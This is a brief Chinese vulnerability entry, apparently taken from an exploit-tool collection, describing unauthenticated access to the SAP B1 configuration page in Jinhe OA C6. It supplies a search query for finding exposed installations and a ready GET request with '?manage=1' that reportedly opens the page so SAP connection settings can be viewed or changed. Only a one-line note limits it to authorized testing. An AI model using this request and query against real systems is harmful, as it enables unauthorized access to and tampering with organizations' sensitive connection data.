---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA SAP_B1Config.aspx 未授权访问漏洞

## 漏洞描述

金和OA C6 `/C6/JHsoft.CostEAI/SAP_B1Config.aspx/`（SAP B1 集成配置页）未授权即可访问，泄露 SAP 集成配置与敏感连接信息。

## 影响版本

```
金和OA C6
```

## 网络测绘

```
app="金和OA"
```

## 漏洞复现

```
GET /C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1 HTTP/1.1
```

直接返回配置管理页面，可查看/篡改 SAP 连接配置。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
